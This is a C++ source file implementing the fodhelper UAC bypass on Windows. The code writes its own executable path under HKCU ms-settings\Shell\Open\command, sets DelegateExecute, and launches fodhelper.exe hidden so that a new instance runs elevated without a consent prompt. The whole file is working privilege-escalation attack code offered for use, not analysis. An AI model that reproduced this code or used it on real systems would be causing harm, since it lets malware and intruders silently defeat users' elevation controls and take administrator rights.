#include "UACBypass.h"
#include <iostream>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

namespace KernelMode {

    bool UACBypass::IsUacEnabled() {
        HKEY hKey;
        DWORD enableLUA = 0;
        DWORD size = sizeof(enableLUA);

        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExW(hKey, L"EnableLUA", NULL, NULL, (LPBYTE)&enableLUA, &size);
            RegCloseKey(hKey);
            return enableLUA == 1;
        }
        return false;
    }

    bool UACBypass::AttemptFodhelperBypass(const std::wstring& arguments) {
        std::wcout << L"[*] Attempting Fodhelper UAC Bypass..." << std::endl;

        HKEY hKey;
        DWORD disposition;
        
        // 1. Clean up potential previous failed attempts
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command");

        // 2. Create the registry structure
        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to create registry key for bypass." << std::endl;
            return false;
        }

        // 3. Set 'DelegateExecute' to empty string (required for the exploits)
        if (RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", 1) != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to set DelegateExecute." << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        // 4. Set '(Default)' to our executable path
        // --- BUG-C005 FIX: Quote path to prevent command injection ---
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        // Construct quoted path to prevent injection via "C:\Program Files\..." → "C:\Program.exe"
        // Also append a special argument to detect we are running effectively re-spawned
        std::wstring quotedPath = L"\"" + std::wstring(exePath) + L"\"";
        
        if(!arguments.empty()) {
            quotedPath += L" " + arguments;
            std::wcout << L"[*] Passing arguments: " << arguments << std::endl;
        }

        // Create the DelegateExecute value first - critical for Fodhelper
        if (RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1) != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to set DelegateExecute." << std::endl;
            RegCloseKey(hKey);
            return false;
        }

        // Set the command to run
        if (RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)quotedPath.c_str(), (DWORD)(quotedPath.length() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
            std::wcerr << L"[-] Failed to set command payload." << std::endl;
            RegCloseKey(hKey);
            return false;
        }
        // --------------------------------------------------------------
        RegCloseKey(hKey);

        // 5. Trigger fodhelper.exe
        // Fodhelper is a Windows binary that auto-elevates to check region settings.
        // It looks at the registry key we just modified for commands to execute.
        std::wcout << L"[*] Triggering fodhelper.exe..." << std::endl;
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas"; // Explicitly request runas, although fodhelper auto-elevates due to manifest
        sei.lpFile = L"fodhelper.exe";
        sei.hwnd = NULL;
        sei.nShow = SW_HIDE;
        
        if (!ShellExecuteExW(&sei)) {
            std::wcerr << L"[-] Failed to execute fodhelper." << std::endl;
            // Cleanup on failure
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command");
            return false;
        }
        
        std::wcout << L"[+] Fodhelper executed successfully. A new elevated instance should launch." << std::endl;
        std::wcout << L"[*] Terminating current non-elevated instance..." << std::endl;
        
        // Give it a moment to read registry before we potentially exit, 
        // though strictly speaking fodhelper runs independently.
        Sleep(1000); 
        
        // We do *not* delete the registry key here immediately because we don't know when fodhelper reads it.
        // The elevated process *should* Ideally clean it up.
        
        return true;
    }
}
